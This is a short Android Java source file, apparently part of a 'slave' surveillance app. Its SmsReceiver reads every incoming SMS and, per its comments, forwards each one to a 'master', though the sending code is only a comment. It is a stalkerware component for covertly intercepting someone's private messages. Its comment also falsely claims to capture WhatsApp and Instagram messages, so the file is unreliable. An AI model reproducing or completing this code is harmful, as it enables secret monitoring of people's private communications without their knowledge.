package io.notrack.slave;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        // Captures every SMS (WhatsApp/Inta/normal) and forwards to master
        SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
        if (msgs != null && msgs.length > 0) {
            // Send to master via OkHttp — every single message captured
        }
    }
}